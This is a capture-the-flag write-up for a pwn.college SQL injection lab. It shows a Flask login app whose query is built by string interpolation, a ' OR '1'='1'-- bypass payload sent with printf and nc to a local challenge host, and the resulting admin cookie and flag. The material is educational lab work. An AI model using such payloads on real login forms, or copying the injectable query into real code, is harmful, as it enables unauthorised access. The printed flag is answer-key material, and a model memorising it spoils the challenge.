---
layout: page
title: "💉 SQL Injection 2 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

This challenge is another classic SQL injection example. We are given a web login form and Flask source code that contains a vulnerable SQL query.

---

## 🧬 Source Code

```python
#!/opt/pwn.college/python

import flask
import os
import sqlite3
import tempfile

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()

# Setup users table
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")

@app.route("/authenticate", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("profile-name")
    password = flask.request.form.get("pass")
    if not username:
        flask.abort(400, "Missing `profile-name` form parameter")
    if not password:
        flask.abort(400, "Missing `pass` form parameter")

    try:
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{password}'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)

@app.route("/authenticate", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=profile-name>Password:<input type=text name=pass><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
---

## Vulnerability
The SQL query is constructed insecurely with string interpolation:
```bash
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{password}'"
```
This makes it trivially injectable via form input, especially since both values are directly wrapped in single quotes.

--- 

## Exploit

### Step 1: Send injection payload
You can bypass the password check with:
```
' OR '1'='1'--
```
So the request becomes:
```bash
printf "POST /authenticate HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:38\r\n\r\nprofile-name=admin&pass=' OR '1'='1'--" | nc challenge.localhost 80
```
This sets the cookie:
```
Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aHy0bQ.aC8W_sVw82LZLYh2G8YbS9EcjP0
```

### Step 2: Access flag using cookie

```bash 
printf "GET /authenticate HTTP/1.0\r\nHost:challenge.localhost\r\nCookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aHy0bQ.aC8W_sVw82LZLYh2G8YbS9EcjP0\r\n\r\n" | nc challenge.localhost 80
```

---

## Flag
```
Hello, admin!<br>Here is your flag: pwn.college{AFxDtmMoLyKvnPrHtMvQ_oJ0UQ4.QXwkzMzwSM0IzMyEzW}
```
Flag: pwn.college{AFxDtmMoLyKvnPrHtMvQ_oJ0UQ4.QXwkzMzwSM0IzMyEzW}

---

